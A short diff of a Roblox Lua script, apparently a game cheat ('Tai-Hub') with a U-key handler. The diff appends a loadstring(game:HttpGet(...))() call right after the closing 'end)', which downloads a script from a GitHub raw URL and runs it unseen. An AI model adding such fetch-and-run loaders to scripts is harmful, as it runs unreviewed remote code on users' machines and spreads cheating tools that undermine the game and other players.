@@ -23,5 +23,4 @@ UserInputService.InputBegan:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.U then
         upV4()
     end
-end)
-https://raw.githubusercontent.com/taitran1501/Tai-Hub/refs/heads/main/Coincard%20Hub
+end)loadstring(game:HttpGet("https://raw.githubusercontent.com/taitran1501/Tai-Hub/refs/heads/main/Coincard%20Hub"))()
